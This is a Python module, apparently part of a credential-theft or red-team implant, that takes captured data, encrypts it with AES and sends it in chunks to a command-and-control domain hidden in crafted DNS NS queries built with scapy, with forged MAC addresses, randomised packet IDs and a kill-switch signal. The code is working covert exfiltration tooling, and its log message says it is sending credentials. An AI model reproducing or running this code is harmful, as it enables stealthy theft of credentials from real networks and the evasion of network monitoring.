import threading
import random
import pyaes
import pyscrypt
import logging
from scapy.all import *

# Me
__author__ = "Emilio / @ekio_jp"
__version__ = "2.020"


class ExfilDNS(threading.Thread):
    def __init__(self, q, conf):
        threading.Thread.__init__(self)
        self.stoprequest = threading.Event()
        self.q = q
        self.magic = conf['MAGIC']
        self.ip = conf['IP']
        self.swmac = conf['SWMAC']
        self.gwmac = conf['GWMAC']
        self.dns = conf['DNS']
        self.ccname = conf['CCNAME']
        self.iface = conf['IFACE']
        self.phrase = conf['PHRASE']
        self.salt = conf['SALT']
        self.max = 25
        if conf['DEBUG']:
            logging.basicConfig(level=logging.DEBUG)

    def run(self):
        while not self.stoprequest.isSet():
            data = self.q.get()
            if data:
                # Kill Switch
                if data == self.magic:
                    self.alarm()
                    self.stoprequest.set()
                else:
                    # encrypt data
                    cry = self.encrypt(data)

                    if len(cry) > self.max:
                        ar = [cry[i:i+self.max] for i in range(0, len(cry), self.max)]
                    else:
                        ar = [cry]

                    # DNS exfiltration
                    # Within a DNS NS pkt, we set the crypto (all of it)
                    # as subdomain <crypto>.ccname
                    logging.debug('Sending credentials via DNS')

                    # Control pkt
                    dnspkt = (Ether(src=self.swmac, dst=self.gwmac) /
                              IP(ihl=5, src=self.ip, dst=self.dns) /
                              UDP(sport=53, dport=53) /
                              DNS(rd=1, qd=DNSQR(qname=str(len(cry)) + 'l.' + self.ccname, qtype='NS'))
                             )
                    dnspkt[IP].id = random.randint(0, 0xFFFF)
                    dnspkt[DNS].id = random.randint(0, 0xFFFF)
                    sendp(dnspkt, iface=self.iface, verbose=0)

                    # craft packet
                    for x in range(len(ar)):
                        dnspkt = (Ether(src=self.swmac, dst=self.gwmac) /
                                  IP(ihl=5, src=self.ip, dst=self.dns) /
                                  UDP(sport=53, dport=53) /
                                  DNS(rd=1, qd=DNSQR(qname=ar[x] + '.' + self.ccname, qtype='NS'))
                                 )
                        dnspkt[IP].id = random.randint(0, 0xFFFF)
                        dnspkt[DNS].id = random.randint(0, 0xFFFF)
                        sendp(dnspkt, iface=self.iface, verbose=0)


    # AES crypto
    def encrypt(self, cleartxt):
        key = pyscrypt.hash(self.phrase.encode(), self.salt.encode(), 1024, 1, 1, 16)
        aes = pyaes.AESModeOfOperationCTR(key)
        ciphertxt = aes.encrypt(cleartxt.encode())
        return ciphertxt.hex()

    # Alarm Funtion
    def alarm(self):
        alarmpkt = (Ether(src=self.swmac, dst=self.gwmac) /
                    IP(ihl=5, src=self.ip, dst=self.dns) /
                    UDP(sport=53, dport=53) /
                    DNS(rd=1, qd=DNSQR(qname=self.magic + '.' + self.ccname, qtype='NS'))
                   )
        alarmpkt[IP].id = random.randint(0, 0xFFFF)
        alarmpkt[DNS].id = random.randint(0, 0xFFFF)
        sendp(alarmpkt, iface=self.iface, verbose=0)

    # Stop Function
    def join(self):
        self.stoprequest.set()
